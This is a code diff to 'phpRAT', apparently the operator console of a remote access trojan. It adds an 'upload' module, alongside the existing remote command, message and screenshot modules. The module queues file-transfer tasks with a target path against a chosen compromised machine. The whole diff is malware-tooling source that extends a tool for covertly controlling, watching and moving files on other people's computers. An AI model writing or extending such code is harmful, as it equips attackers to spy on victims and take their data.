@@ -17,9 +17,10 @@ class CLI(cmd.Cmd):
     intro = 'Welcome to phpRAT, use ? to see the commands\n'
     prompt = '(phpRAT) '
     machine_id = None
-    modules = ['msg', 'cmd', 'screenshot']
+    modules = ['msg', 'cmd', 'screenshot', 'upload']
     message = None
     command = None
+    path = None
 
     def get_curr_module(self):
         return re.search('\((.+?)\) ', self.prompt).group(1)
@@ -88,6 +89,9 @@ class CLI(cmd.Cmd):
                       "Option", "Value", "Required"]), end='\n\n')
             elif curr_module == 'screenshot':
                 options = [('machine', str(self.machine_id), 'True')]
+            elif curr_module == 'upload':
+                options = [('machine', str(self.machine_id), 'True'),
+                           ('path', str(self.path), 'True')]
                 print(tabulate(options, headers=[
                       "Option", "Value", "Required"]), end='\n\n')
         else:
@@ -104,6 +108,8 @@ class CLI(cmd.Cmd):
             self.message = ' '.join(args[1:])
         elif 'command' in args[0]:
             self.command = ' '.join(args[1:])
+        elif 'path' in args[0]:
+            self.path = ' '.join(args[1:])
         else:
             print("Use help!")
 
@@ -126,6 +132,8 @@ class CLI(cmd.Cmd):
             self.prompt = "(cmd) "
         if 'screenshot' in args:
             self.prompt = "(screenshot) "
+        if 'upload' in args:
+            self.prompt = "(upload) "
 
     def do_execute(self, args):
         curr_module = self.get_curr_module()
@@ -150,6 +158,14 @@ class CLI(cmd.Cmd):
                 print(f"Added Task {task_id}")
             else:
                 print("Check Options!")
+        elif curr_module == 'upload':
+            if self.machine_id:
+                task_id = queue.insert(
+                    'upload', self.machine_id, args=[self.path])
+                print(f"Added Task {task_id}")
+            else:
+                print("Check Options!")
+
     def complete_show(self, text, line, begidx, endidx):
         args_len = 2
         completions = ['machines', 'queue']
@@ -171,6 +187,8 @@ class CLI(cmd.Cmd):
             completions = ['machine', 'command']
         elif 'screenshot' in self.get_curr_module():
             completions = ['machine']
+        elif 'upload' in self.get_curr_module():
+            completions = ['machine', 'path']
         if 'machine' in line:
             lock.acquire(True)
             db.c.execute('SELECT machineId FROM machines')
@@ -221,7 +239,7 @@ if __name__ == "__main__":
     baburao_thread.start()
     time.sleep(1)
     system('cls' if name == 'nt' else 'clear')
-    fonts_list = ['basic', 'big', 'chunky','slant','epic','standard']
+    fonts_list = ['basic', 'big', 'chunky', 'slant', 'epic', 'standard']
     font = random.choice(fonts_list)
     f = Figlet(font=font)
     print(f.renderText('phpRAT'))
